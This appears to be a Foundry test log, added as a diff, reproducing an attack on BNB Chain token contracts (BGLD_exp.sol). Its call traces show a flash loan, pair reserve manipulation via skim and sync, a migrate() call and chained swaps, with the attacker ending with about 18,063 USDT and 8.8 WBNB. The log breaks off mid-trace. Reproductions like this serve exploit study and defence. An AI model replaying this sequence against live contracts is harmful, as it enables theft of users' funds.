@@ -1,0 +1,436 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.26s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2022-12/BGLD_exp.sol:17:5:
+   |
+17 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2022-12/BGLD_exp.sol:18:5:
+   |
+18 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:1582:1:
+     |
+1582 | interface USDT {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 231.57ms (113.13µs CPU time)
+
+Ran 1 test for src/test/2022-12/BGLD_exp.sol:ContractTest
+[PASS] testExploit() (gas: 958768)
+Logs:
+  [End] Attacker USDT balance after exploit: 18063.363736130073638413
+  [End] Attacker WBNB balance after exploit: 8.795805412983842275
+
+Traces:
+  [1057668] ContractTest::testExploit()
+    ├─ [24665] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [24665] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::approve(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [25279] 0x169f715CaE1F94C203366a6890053E817C767B7C::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [24665] 0xC632F90affeC7121120275610BF17Df9963F181c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [297792] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4::flashLoan(125000000000000000000 [1.25e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 125000000000000000000 [1.25e20])
+    │   │   ├─ emit Transfer(from: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 125000000000000000000 [1.25e20])
+    │   │   └─ ← [Return] true
+    │   ├─ [238904] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 125000000000000000000 [1.25e20], 0, 0x00)
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 125000000000000000000 [1.25e20]
+    │   │   ├─ [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x7526cC9121Ba716CeC288AF155D110587e55Df8b, 125000000000000000000 [1.25e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, value: 125000000000000000000 [1.25e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9611] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(125000000000000000000 [1.25e20], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3]) [staticcall]
+    │   │   │   ├─ [2893] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 8795812119540504580 [8.795e18], 231743012965866 [2.317e14], 1670630737 [1.67e9]
+    │   │   │   └─ ← [Return] [125000000000000000000 [1.25e20], 216472429926702 [2.164e14]]
+    │   │   ├─ [95140] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::swap(0, 194825186934031 [1.948e14], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [60753] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194825186934031 [1.948e14])
+    │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: 0x0000000000000000000000000000000000000000, value: 3896503738680 [3.896e12])
+    │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 194825186934031 [1.948e14])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 133795812119540504580 [1.337e20]
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 17435307338435 [1.743e13]
+    │   │   │   ├─ emit Sync(reserve0: 133795812119540504580 [1.337e20], reserve1: 17435307338435 [1.743e13])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 125000000000000000000 [1.25e20], amount1In: 0, amount0Out: 0, amount1Out: 194825186934031 [1.948e14], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   └─ ← [Return] 17435307338435 [1.743e13]
+    │   │   ├─ [11653] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(0x7526cC9121Ba716CeC288AF155D110587e55Df8b, 174353073384360 [1.743e14])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 3487061467686 [3.487e12])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, value: 174353073384360 [1.743e14])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23457] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 133795812119540504580 [1.337e20]
+    │   │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 191788380722795 [1.917e14]
+    │   │   │   ├─ [11653] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 174353073384360 [1.743e14])
+    │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: 0x0000000000000000000000000000000000000000, value: 3487061467686 [3.487e12])
+    │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 174353073384360 [1.743e14])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [8987] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::sync()
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 133795812119540504580 [1.337e20]
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   ├─ emit Sync(reserve0: 133795812119540504580 [1.337e20], reserve1: 5)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [62433] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000 [1e8], 0, [0xC2319E87280c64e2557a51Cb324713Dd8d1410a3, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670859422 [1.67e9])
+    │   │   │   ├─ [14474] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, 100000000 [1e8])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 2000000 [2e6])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, value: 100000000 [1e8])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913029639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [893] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 133795812119540504580 [1.337e20], 5, 1670859422 [1.67e9]
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   └─ ← [Return] 100000005 [1e8]
+    │   │   │   ├─ [38265] 0x7526cC9121Ba716CeC288AF155D110587e55Df8b::swap(133795805412983842275 [1.337e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 133795805412983842275 [1.337e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x7526cC9121Ba716CeC288AF155D110587e55Df8b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 133795805412983842275 [1.337e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6706556662305 [6.706e12]
+    │   │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x7526cC9121Ba716CeC288AF155D110587e55Df8b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 100000005 [1e8]
+    │   │   │   │   ├─ emit Sync(reserve0: 6706556662305 [6.706e12], reserve1: 100000005 [1e8])
+    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 100000000 [1e8], amount0Out: 133795805412983842275 [1.337e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 133795805412983842275 [1.337e20]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, 125000000000000000000 [1.25e20])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, value: 125000000000000000000 [1.25e20])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
+    │   │   └─ ← [Return] 1917039083563702188610 [1.917e21]
+    │   ├─ [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
+    │   │   └─ ← [Return] 500437223009221246363553 [5.004e23]
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
+    │   │   └─ ← [Return] 1917039083563702188610 [1.917e21]
+    │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
+    │   │   └─ ← [Return] 500437223009221246363553 [5.004e23]
+    │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 125000000000000000000 [1.25e20], : 0)
+    │   └─ ← [Stop] 
+    ├─ [98650] 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb::migrate()
+    │   ├─ [93758] 0x67d7249D581169516E49a88eEC11370234100fb7::migrate() [delegatecall]
+    │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 177389769595601 [1.773e14]
+    │   │   ├─ [567] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::isExcludedFromFee(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [21274] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, 161263426905090 [1.612e14])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 3225268538100 [3.225e12])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 161263426905090 [1.612e14])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 115792089237316195423570985008687907853269984665640564039457583846649702734845 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [35340] 0x169f715CaE1F94C203366a6890053E817C767B7C::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 177389769595601 [1.773e14])
+    │   │   │   ├─ emit Transfer(from: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 177389769595601 [1.773e14])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [19273] 0x169f715CaE1F94C203366a6890053E817C767B7C::transferFrom(0x077D12657826369A01638500229205995F78e206, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17738976959560 [1.773e13])
+    │   │   │   ├─ emit Approval(owner: 0x077D12657826369A01638500229205995F78e206, spender: 0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb, value: 95465280133301800024 [9.546e19])
+    │   │   │   ├─ emit Transfer(from: 0x077D12657826369A01638500229205995F78e206, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17738976959560 [1.773e13])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 195128746555161 [1.951e14]
+    ├─ [127281] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(175615871899644 [1.756e14], 0, [0x169f715CaE1F94C203366a6890053E817C767B7C, 0xC632F90affeC7121120275610BF17Df9963F181c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670859422 [1.67e9])
+    │   ├─ [47623] 0x169f715CaE1F94C203366a6890053E817C767B7C::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, 175615871899644 [1.756e14])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAE85A0d7406e83436A9d0753c8F9Fe1fcbb6FcD8, value: 7024634875984 [7.024e12])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x077D12657826369A01638500229205995F78e206, value: 7024634875984 [7.024e12])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 3512317437992 [3.512e12])
+    │   │   ├─ emit Fee(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 17561587189960 [1.756e13])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, value: 175615871899644 [1.756e14])
+    │   │   └─ ← [Return] true
+    │   ├─ [2585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] 0x559D0deAcAD259d970f65bE611f93fCCD1C44261::getReserves() [staticcall]
+    │   │   └─ ← [Return] 10037772659231688 [1.003e16], 4292085622002 [4.292e12], 1670859334 [1.67e9]
+    │   ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   └─ ← [Return] 10213388531131332 [1.021e16]
+    │   ├─ [63001] 0x559D0deAcAD259d970f65bE611f93fCCD1C44261::swap(0, 73619669176 [7.361e10], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [28152] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 73619669176 [7.361e10])
+    │   │   │   ├─ emit Transfer(from: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 73619669176 [7.361e10])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [952] 0x169f715CaE1F94C203366a6890053E817C767B7C::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   │   └─ ← [Return] 10213388531131332 [1.021e16]
+    │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x559D0deAcAD259d970f65bE611f93fCCD1C44261) [staticcall]
+    │   │   │   └─ ← [Return] 4218465952826 [4.218e12]
+    │   │   ├─ emit Sync(reserve0: 10213388531131332 [1.021e16], reserve1: 4218465952826 [4.218e12])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 175615871899644 [1.756e14], amount1In: 0, amount0Out: 0, amount1Out: 73619669176 [7.361e10], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 73619669176 [7.361e10]
+    │   └─ ← [Stop] 
+    ├─ [209299] 0x559D0deAcAD259d970f65bE611f93fCCD1C44261::swap(0, 950000000000 [9.5e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [3452] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 950000000000 [9.5e11])
+    │   │   ├─ emit Transfer(from: 0x559D0deAcAD259d970f65bE611f93fCCD1C44261, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 950000000000 [9.5e11])
+    │   │   └─ ← [Return] true
+    │   ├─ [189717] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 950000000000 [9.5e11], 0x00)
+    │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1023619669176 [1.023e12]
+    │   │   ├─ [8252] 0xC632F90affeC7121120275610BF17Df9963F181c::transfer(0x429339fa7A2f2979657B25ed49D64d4b98a2050d, 1023619669176 [1.023e12])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, value: 1023619669176 [1.023e12])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2893] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 202057153674518 [2.02e14], 22890793447 [2.289e10], 1670479098 [1.67e9]
+    │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   └─ ← [Return] 1046510462623 [1.046e12]
+    │   │   ├─ [52891] 0x429339fa7A2f2979657B25ed49D64d4b98a2050d::swap(177863969485533 [1.778e14], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [18453] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 177863969485533 [1.778e14])
+    │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: 0x0000000000000000000000000000000000000000, value: 3557279389710 [3.557e12])
+    │   │   │   │   ├─ emit Transfer(from: 0x429339fa7A2f2979657B25ed49D64d4b98a2050d, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 177863969485533 [1.778e14])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [541] 0xC2319E87280c64e2557a51Cb324713Dd8d1410a3::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
+    │   │   │   │   └─ ← [Return] 6406787240435 [6.406e12]
+    │   │   │   ├─ [585] 0xC632F90affeC7121120275610BF17Df9963F181c::balanceOf(0x429339fa7A2f2979657B25ed49D64d4b98a2050d) [staticcall]
